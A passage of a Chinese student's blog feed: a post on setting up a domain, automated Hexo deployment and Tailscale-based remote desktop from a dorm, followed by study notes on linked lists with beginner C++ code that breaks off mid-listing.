    <category term="记录" scheme="https://notes.moyuin.top/tags/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="学习" scheme="https://notes.moyuin.top/tags/%E5%AD%A6%E4%B9%A0/"/>
    
    <category term="CTF" scheme="https://notes.moyuin.top/tags/CTF/"/>
    
    <category term="writeup" scheme="https://notes.moyuin.top/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>记录与计划</title>
    <link href="https://notes.moyuin.top/2025/03/03/sheng-huo/ji-lu/xiao-ji-lu/"/>
    <id>https://notes.moyuin.top/2025/03/03/sheng-huo/ji-lu/xiao-ji-lu/</id>
    <published>2025-03-03T15:10:19.000Z</published>
    <updated>2025-03-03T15:10:19.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>记录与计划</h1><p>记录一些最近的小成就。🥳</p><h2 id="购买域名，实现国内浏览✅">购买域名，实现国内浏览✅</h2><p>之前在github pages默认的.github.io实现博客部署，在国内访问也太困难了，本来一直很苦恼于这个问题。<br>但最近，于2025.3.1在namesilo购买了moyuin.top域名，并交给cloudflare托管，将github pages的网站转发到这个域名里，实现在国内也可以顺利浏览我的博客。<br><strong>可以更方便的给同学发笔记了</strong>。😎</p><hr><h2 id="实现自动部署✅">实现自动部署✅</h2><h3 id="初步解决自动部署！">初步解决自动部署！</h3><p>之前苦恼于hexo三部曲输入三个指令也太麻烦。并且在博客写的文章，无论是手机写的还是平板写的，都得通过局域网传输到电脑上，然后电脑整理分类后再进行hexo三部曲。<br><strong>现在记录笔记是Obsidian+Git+Sync方案</strong>，Obsidian把仓库插件整合到文件夹里也太好用了，我的git插件只要所有设备sync同步一下，文件夹里的东西直接互通，运行无障碍。<br>然后只要再Obsidian里面commit和push一下就可以直接自动放到代码仓库里面，交由远程的Github action进行hexo三部曲，极大地改善了写博文的舒适度。<br>并且放在vscode里面，只要点点点就可以实现git提交和同步，在电脑上整理代码笔记也更加方便了。<br>实现了懒人同步！🤪<br>了吗?😢</p><hr><h3 id="同步问题">同步问题</h3><p>目前还有一个问题，为了节约手机和平板的内存和避免其他配置类文件与它进行冲突，所以我的共享文件夹都只是共享了含有博客文章管理的source文件夹。<br>😭导致我的git文件夹没有同步进来。<br><em>目前还得写好然后用一个电脑提交…</em><br><em>思考解决方法中。</em></p><blockquote><p>好像最佳方法是使用submodule去进行管理，得研究一下。<br>当然也有另一种方法，是直接Obsidian库迁移为博客源代码库，但是这样过于麻烦，并且我那配置仅仅是6+128g的小平板在说求放过，手机也在说不要增添一些莫名其妙的垃圾文件污染了。😔</p></blockquote><hr><h3 id="问题解决！">问题解决！</h3><p>通过把source通过submodule连接博客仓库，实现了在source里面的git仓库与博客仓库的联动！顺便加入了新的github action，当检测到source文件夹变动并且推送到source仓库的时候，我的博客仓库自动commit和push，然后引发自动部署！<br>😋已经实现懒人部署！</p><hr><h2 id="远程桌面！⭐">远程桌面！⭐</h2><p><strong>这绝对是目前最伟大的成就！</strong></p><h3 id="局域网初步">局域网初步</h3><p>寒假买了平板，听说了moonlight+sunshine的局域网远程桌面方案，想着最大化利用平板，于是寒假开始了初步操作。<br>局域网连接很快，我的平板很顺利的连上了电脑！我将沉重的游戏本电脑丢到一边，抱着键盘鼠标和平板在床上玩了起来…<strong>只要连接同一个网络，我的平板就能连接电脑高画质流畅运行各大游戏</strong>，黑神话，大表哥，看门狗，应有尽有…<br>但我选择了每天在床上or烤火炉前玩解锁帧率的高帧率原神🤪…玩原神玩的。<br><strong>但局域网还是有一个缺陷</strong>，只要平板和电脑不连接同一网络，我的平板就识别不到电脑存在。<br>下一步考虑远程连接。</p><hr><h3 id="远程桌面初步">远程桌面初步</h3><p>开学后背着电脑回了学校，在一个寒假轻量级平板的洗礼后，开始觉得我的游戏本很沉重了。（<em>明明买的时候特意买的最轻的游戏本</em>），于是开始钻研怎么在不同网络下实现远程桌面。</p><hr><h4 id="微软远程桌面RDP-❌">微软远程桌面RDP?❌</h4><p>RDP是微软用windows的远程桌面，确实好用，但是开端口转发，没有路由器中转，也没有自己的服务器支持，只能考虑通过校园网的局域网来实现宿舍与教室的连接。<br>况且RDP在局域网内的表现也表现的不稳定。而且在Skywt的学长的<a href="https://skywt.cn/blog/wireshark-sniff#%E6%A0%A1%E5%9B%AD%E7%BD%91%E7%9A%84-ap-%E9%9A%94%E7%A6%BB">一篇博客</a>里了解到HNU的校园网不同于普通局域网，<strong>校园网是AP隔离的</strong>，不同设备连接校园网是无法相互访问的，即便电脑和平板都连接的是宿舍区域的校园网，也无法通过moonlight找到电脑设备。<br>因此只能考虑其他软件提供的远程连接服务，或者是利用校园网进行局域网连接，内网穿透。</p><hr><h4 id="todesk等网络远程连接-❓">todesk等网络远程连接?❓</h4><p><strong>流畅情况依赖于网速。</strong><br>校园网网速感人，望周知。且HNU的校园网面向全体师生，也不了解学校的网络是如何分配带宽的，对于远程桌面的实现，如果采用服务器中转，在校园网的给力下，甚至<strong>无法做到稳定60帧</strong>。<br>用Todesk等软件的确可以实现远程连接，不过设备兼容性并没有moonlight好（比如我键盘alt+tab在todesk里是给自己平板切换界面，非常反人类），不过也能正常使用它的锁屏和开机功能，可以做应急使用，故作保留。</p><hr><h4 id="申请公网ipv6连接-❌">申请公网ipv6连接?❌</h4><p>呃，连接校园网，没有公网ipv6的可能性。且没有办理校园宽带（听说那个也浪费钱，速度慢，也不稳定），在宿舍只有随身wifi插着电话卡当路由器，更没有实现公网转发的可能性。</p><hr><h4 id="校园网-tailscale内网穿透，打破AP隔离，校园区域P2P直连✅">校园网+tailscale内网穿透，打破AP隔离，校园区域P2P直连✅</h4><p>那在校园区域内，只有一种做法了，也就是转向校园网…既然校园网内不允许局域网设备互相访问，那就使用内网穿透进行直连吧，经检验，这个方法最流畅（可以做到2k120帧），并且在moonlight的给力设备兼容下，在平板键盘的操作与电脑键盘无异。<br>采用免费的tailscale做内网穿透，主要是给ip直接所有设备登陆同一账号就行，非常便利。<br>在设备同连接校园网的情况下，tailscale可以做到内网穿透，并且也支持sync的同步数据，非常贴合我的需求，暂时不想过多折腾它了，我已经非常满意它的表现。</p><hr><h4 id="但仍然有缺点…">但仍然有缺点…</h4><p>基于tailscale的内网穿透，在设备连接不同网络下，tailscale就会走relay中转，毕竟是国外软件，中转服务器最近的是来自Tokyo的服务器…流畅度不言而喻。<br>这样的话，我只要一离开校园区域，也就是有校园网的地方，我的远程桌面几乎等于失效。<br>因此之后想要解决这个问题，目前来看必须有一个自己能用的国内服务器，拉过来做中转才可以…目前限制极多，且自己还是新手，对服务器的维护一无所知，万一哪一天服务器被攻击，现在的我是束手无策，因此只能潜心凝力…<br>这个方案的完美实现道阻且长。不过实现了的话，我也可以考虑换一台台式机放在宿舍里了…</p><h2 id="下一步想做的？">下一步想做的？</h2><h3 id="拿到一个服务器✅">拿到一个服务器✅</h3><h4 id="折腾一下科学上网✅">折腾一下科学上网✅</h4><p>我也很想有个属于自己的流畅上网工具。<br>虽然说现在用的这个很稳定，而且也不用我掏钱维护（这时候还得看爹），但是我还是想尝试独立一下的，总得试试，不能总靠爹。万一哪天有了问题，还是自己维护的好。</p><p><strong>有了有了</strong>，github学生认证拿到一台digitalocean的vps，做wireguard也够折腾了🥳，而且时间足够我撑到成年购买一台自己的。<br>问题是不太稳定，还没搞懂这个怎么搞，先放着。</p><hr><h4 id="迁移博客">迁移博客</h4><p>将博客放在github pages里面部署确实方便，但是这样好像也会限制我的一些…自由性？给自己的博客网站备案什么的 。<em>（虽然我11月才成年…)</em></p><hr><h4 id="找一个能用的服务器做frp转发，完善远程桌面。">找一个能用的服务器做frp转发，完善远程桌面。</h4><hr><h3 id="了解一下RSS订阅-✅"><strong>了解一下RSS订阅</strong> ✅</h3><p>我看很多大佬上面都挂着一个RSS订阅，是什么东西，我能搞吗？<br>好像挺高级的，可是现在我连友链都没有，我需要去好好折腾一下。</p><p>成功搞了一个rss订阅…但应该只有我自己会订阅我自己吧，毕竟我的文章没有什么很含价值，引人思考的内容🤕</p><hr><h3 id="拉到友链上的朋友">拉到友链上的朋友</h3><p>我写博客大多数还是给自己留个记录，在网站上美观地看我的记录，换台设备只要浏览我的博客网站就可以随时随地的去获取信息，很方便。<br>但是我也希望有一个能挂在友链上的朋友…不是带有功利性的，只是想在这个小圈子里，多一个可以分享思考和感悟的人吧。</p><p><strong>未完待续…</strong></p>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot;</summary>
        
      
    
    
    
    <category term="杂谈" scheme="https://notes.moyuin.top/categories/%E6%9D%82%E8%B0%88/"/>
    
    
    <category term="记录" scheme="https://notes.moyuin.top/tags/%E8%AE%B0%E5%BD%95/"/>
    
    <category term="计划" scheme="https://notes.moyuin.top/tags/%E8%AE%A1%E5%88%92/"/>
    
    <category term="生活" scheme="https://notes.moyuin.top/tags/%E7%94%9F%E6%B4%BB/"/>
    
  </entry>
  
  <entry>
    <title>数据结构-线性表笔记</title>
    <link href="https://notes.moyuin.top/2025/02/26/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-xian-xing-biao-bi-ji/"/>
    <id>https://notes.moyuin.top/2025/02/26/xue-xi/shu-ju-jie-gou/shu-ju-jie-gou-xian-xing-biao-bi-ji/</id>
    <published>2025-02-26T09:53:40.000Z</published>
    <updated>2025-02-26T09:53:40.000Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1>数据结构-线性表笔记</h1><p>普通的数组与出入栈在STL很好用，但是涉及链表进行指针操作较为薄弱，因此记录一下链表的操作。</p><hr><h2 id="链表的创建">链表的创建</h2><h3 id="单向链表的创建">单向链表的创建</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token comment">// 创建单向链表</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> data<span class="token punctuation">;</span> <span class="token comment">//数据</span>    Node <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">//指向下一元素</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>单向链表的操作的时间复杂度，插入和删除的时间复杂度为O(n)(n为链表长度)，查找的时间复杂度为O(n)(n为链表长度)</strong></p><hr><h3 id="双向链表的创建">双向链表的创建</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">struct</span> <span class="token class-name">Node</span> <span class="token comment">// 创建双向链表</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> data<span class="token punctuation">;</span>    Node <span class="token operator">*</span>next<span class="token punctuation">;</span> <span class="token comment">// 指向下一元素</span>    Node <span class="token operator">*</span>prev<span class="token punctuation">;</span><span class="token comment">// 指向上一元素</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>双向链表的操作的时间复杂度与单向链表类似，只是在插入和删除时需要更改指针的指向，所以时间复杂度为O(n)(n为链表长度)</strong></p><hr><h3 id="块状链表-循环链表的创建">块状链表,循环链表的创建</h3><p>都与基本链表的创建有关。</p><ul><li><p>循环链表将末尾元素的next指针指向首元素，构建循环。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 循环链表的构建</span><span class="token keyword">struct</span> <span class="token class-name">CircularNode</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> data<span class="token punctuation">;</span>    CircularNode<span class="token operator">*</span> next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 在插入数据时候，末尾进行</span>newNode<span class="token operator">-></span>next <span class="token operator">=</span> head<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>块状链表是由多个链表拼接，存储的数据（data）是不同链表的指针。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token comment">// 块状链表的构建</span><span class="token keyword">struct</span> <span class="token class-name">Block</span> <span class="token punctuation">&#123;</span>    vector<span class="token operator">&lt;</span>Node<span class="token operator">*</span><span class="token operator">></span> nodes<span class="token punctuation">;</span>    Block<span class="token operator">*</span> next<span class="token punctuation">;</span>    Block<span class="token operator">*</span> prev<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>双向链表与指针结合，构建连接不同双向链表的块状链表，存储数据的同时，还存储了指向前后块的指针，这样就可以在O(sqrt(n))的时间内找到任意一个元素。使用块状链表，可以减少查找的时间复杂度，为O(sqrt(n))。</strong></p></li></ul><hr><h2 id="链表的基本操作">链表的基本操作</h2><h3 id="链表的插入">链表的插入</h3><p><strong>（这里以单向链表为例)</strong></p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>Node <span class="token operator">*</span><span class="token operator">&amp;</span>head<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Node <span class="token operator">*</span>newNode <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">Node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 创建一个新的结点</span>    newNode<span class="token operator">-></span>data <span class="token operator">=</span> value<span class="token punctuation">;</span>    <span class="token comment">// 赋值</span>    newNode<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>  <span class="token comment">// 初始化next指针</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>head <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        head <span class="token operator">=</span> newNode<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">// 如果链表为空，直接插入</span>    <span class="token keyword">else</span>    <span class="token punctuation">&#123;</span>        Node <span class="token operator">*</span>temp <span class="token operator">=</span> head<span class="token punctuation">;</span>        <span class="token keyword">while</span> <span class="token punctuation">(</span>temp<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span> <span class="token comment">// 遍历链表，找到最后一个结点</span>        <span class="token punctuation">&#123;</span>            temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        temp<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>逻辑很简单。</p><ul><li><p>先创一个新结点（因为是指针形式的，所以用new形式建立）。</p></li><li><p>然后给data赋值。</p></li><li><p>再看看它要插入的地方是不是head，是head就简单，直接把它的next设立为head。</p><blockquote><p><em>如果是双向链表就再注意一下head的prev改成新结点</em></p></blockquote></li><li><p>不是head的话，直接while找到要插入的位置（这里自己设定while的循环条件），然后改要插入位置的前者next为它的next，然后把前者的next改为它。</p><blockquote><p>如果是双向链表的话注意一下前者的next的prev也要改成它，它的prev改成前者。</p></blockquote> <pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">while</span> <span class="token punctuation">(</span>temp<span class="token operator">-></span>id <span class="token operator">!=</span> k<span class="token punctuation">)</span><span class="token comment">//k为要插入的位置，这里做个示范</span>      <span class="token punctuation">&#123;</span>          temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>temp<span class="token operator">-></span>next <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>      <span class="token punctuation">&#123;</span>          temp<span class="token operator">-></span>next<span class="token operator">-></span>prev <span class="token operator">=</span> newNode<span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>      newNode<span class="token operator">-></span>next <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>     temp<span class="token operator">-></span>next <span class="token operator">=</span> newNode<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>然后改完了就完事，插入一个结点嘛。</p><p><strong>不过这个方法的时间复杂度为O(n)，在进行大数据的遍历的时候和有可能耗时巨大，之后的学习生活中会学习二叉树，哈希表等方法来优化</strong>。</p><hr></li></ul><h3 id="链表的结点删除">链表的结点删除</h3><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">deleteData</span><span class="token punctuation">(</span>Node <span class="token operator">*</span><span class="token operator">&amp;</span>head<span class="token punctuation">,</span> <span class="token keyword">int</span> value<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Node <span class="token operator">*</span>temp <span class="token operator">=</span> head<span class="token punctuation">;</span>    Node <span class="token operator">*</span>prev <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> temp<span class="token operator">-></span>data <span class="token operator">==</span> value<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        head <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>        <span class="token keyword">delete</span> temp<span class="token punctuation">;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">// 删除头结点</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> temp<span class="token operator">-></span>data <span class="token operator">!=</span> value<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        prev <span class="token operator">=</span> temp<span class="token punctuation">;</span>        temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">// 找到要删除的结点，遍历</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">return</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">// 没找到要删除的结点，没有值对应的链表节点</span>    prev<span class="token operator">-></span>next <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token keyword">delete</span> temp<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>首先最重要的，head的函数引用为&amp;head！因为head很有可能也是删除结点！</strong></p><p><strong>否则退出函数后head并没有进行改变操作，将会造成RE即运行时错误。</strong></p><ul><li><p>先建立一个temp结点，给它先变成head结点，这样可以解决head因为是引用形式的不能轻易去改变值的问题，利于后续while循环来查找值。</p></li><li><p>在写之前要考虑三种情况</p><ol><li>链表是空的，那删什么？</li><li>链表找不到我要删掉的值，那删什么？</li><li>链表要删掉头，那遍历什么？</li></ol></li><li><p>然后用if来判断一下情况。</p><ul><li><p>先考虑如果是链表是空的，那我们就可以什么都不做了。</p><p><code> if (temp == nullptr) return;</code></p></li><li><p>再想想如果删掉头，那我们就不用遍历了。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> temp<span class="token operator">-></span>data <span class="token operator">==</span> value<span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>      head <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>      <span class="token keyword">delete</span> temp<span class="token punctuation">;</span>      <span class="token keyword">return</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>然后就可以开始愉快地遍历了。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">while</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token keyword">nullptr</span> <span class="token operator">&amp;&amp;</span> temp<span class="token operator">-></span>data <span class="token operator">!=</span> value<span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        prev <span class="token operator">=</span> temp<span class="token punctuation">;</span>        temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token comment">// 找到要删除的结点，遍历</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>找到的话，我们需要把这个结点的前者连接到下一结点。如果是双向链表很方便，直接<code>temp-&gt;prev-&gt;next=temp-&gt;next</code>了，不需要prev的参与。</p><p>但这里是单向链表，我们还是要有一个临时指针指向temp的前者的，也塞进去循环里就可以了，然后进行一样的操作。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp">prev<span class="token operator">-></span>next <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></li><li><p>没找到的话，那我们这个while的操作一直运行，直到temp变成了链表尾部的next，即就是空指针NULL。</p><p><strong>那prev指向的结点就是原链表尾部，temp为nullptr的话，那temp就没有next的值。这样的话进行最后一步就会报错，注意这里的内存管理。</strong></p><p>这里选择用语句直接包揽1和2情况。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">if</span> <span class="token punctuation">(</span>temp <span class="token operator">==</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>   <span class="token punctuation">&#123;</span>       <span class="token keyword">return</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li><p>这里体现删除的操作的时间复杂度为O(n)。</p></li></ul><hr></li></ul><h3 id="链表的显示输出">链表的显示输出</h3><p>很简单，从头开始while循环输出值即可。</p><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token keyword">void</span> <span class="token function">printList</span><span class="token punctuation">(</span>Node <span class="token operator">*</span>head<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    Node <span class="token operator">*</span>temp <span class="token operator">=</span> head<span class="token punctuation">;</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>temp <span class="token operator">!=</span> <span class="token keyword">nullptr</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        cout <span class="token operator">&lt;&lt;</span> temp<span class="token operator">-></span>data <span class="token operator">&lt;&lt;</span> <span class="token string">" "</span><span class="token punctuation">;</span>        temp <span class="token operator">=</span> temp<span class="token operator">-></span>next<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    cout <span class="token operator">&lt;&lt;</span> endl<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>也是从头遍历到尾部，时间复杂度为O(n)。</p><h2 id="链表的操作实战">链表的操作实战</h2><h3 id="实战题目">实战题目</h3><p>题目源于洛谷数据结构题单【数据结构1-1】线性表p1160<a href="https://www.luogu.com.cn/problem/P1160">队列安排</a>。</p><hr><h3 id="非AC代码"><strong>非AC代码</strong></h3><p><strong>采用基础的遍历来解决问题</strong>，在数据较小的时候可以满足结果，而数据较大时候因为O(n^2)的时间复杂度而导致TLE，解决方法见注释。</p><details>  <summary>点击查看代码 </summary><pre class="line-numbers language-cpp" data-language="cpp"><code class="language-cpp"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;iostream></span></span><span class="token keyword">using</span> <span class="token keyword">namespace</span> std<span class="token punctuation">;</span><span class="token comment">//面对大数据来写直接插入排序，时间复杂度为O(n^2)。</span><span class="token comment">//插入排序与删除的优点是不需要额外的空间，缺点是查找时间复杂度较高。</span><span class="token comment">//优化的话可以考虑利用哈希表，查找时间复杂度为O(1)，空间复杂度为O(n)</span><span class="token comment">//另外一种方法是利用二叉搜索树，查找时间复杂度为O(nlogn)，空间复杂度为O(n)</span><span class="token keyword">struct</span> <span class="token class-name">node</span><span class="token punctuation">&#123;</span>    <span class="token keyword">int</span> id<span class="token punctuation">;</span>    node <span class="token operator">*</span>prev<span class="token punctuation">;</span>    node <span class="token operator">*</span>next<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>node <span class="token operator">*</span><span class="token operator">&amp;</span>head<span class="token punctuation">,</span> <span class="token keyword">int</span> k<span class="token punctuation">,</span> <span class="token keyword">int</span> i<span class="token punctuation">,</span> <span class="token keyword">bool</span> left<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">deleteValue</span><span class="token punctuation">(</span>node <span class="token operator">*</span><span class="token operator">&amp;</span>head<span class="token punctuation">,</span> <span class="token keyword">int</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">void</span> <span class="token function">printList</span><span class="token punctuation">(</span>node <span class="token operator">*</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    ios<span class="token double-colon punctuation">::</span><span class="token function">sync_with_stdio</span><span class="token punctuation">(</span><span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cin<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    cout<span class="token punctuation">.</span><span class="token function">tie</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n<span class="token punctuation">,</span> m<span class="token punctuation">;</span>    cin <span class="token operator">>></span> n<span class="token punctuation">;</span>    node <span class="token operator">*</span>head <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token function">node</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    head<span class="token operator">-></span>id <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    head<span class="token operator">-></span>next <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    head<span class="token operator">-></span>prev <span class="token operator">=</span> <span class="token keyword">nullptr</span><span class="token punctuation">;</span>    <span class="token comment">// 重整顺序</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> k<span class="token punctuation">,</span> p<span class="token punctuation">;</span>        cin <span class="token operator">>></span> k <span class="token operator">>></span> p<span class="token punctuation">;</span>        <span class="token keyword">bool</span> left <span class="token operator">=</span> <span class="token punctuation">(</span>p <span class="token operator">==</span> <span class="token number">0</span> <span class="token operator">?</span> <span class="token boolean">true</span> <span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">insert</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> k<span class="token punctuation">,</span> i<span class="token punctuation">,</span> left<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// printList(head);</span>    <span class="token punctuation">&#125;</span>    cin <span class="token operator">>></span> m<span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> m<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>        <span class="token keyword">int</span> id<span class="token punctuation">;</span>        cin <span class="token operator">>></span> id<span class="token punctuation">;</span>        <span class="token function">deleteValue</span><span class="token punctuation">(</span>head<span class="token punctuation">,</span> id<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// printList(head);</span>    <span class="token punctuation">&#125;</span>    <span class="token function">printList</span><span class="token punctuation">(</span>head<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token comment">// 链表手写数据结构版本</span><span class="token keyword">void</span> <span class="token function">insert</span><span class="token punctuation">(</span>node <span class="token 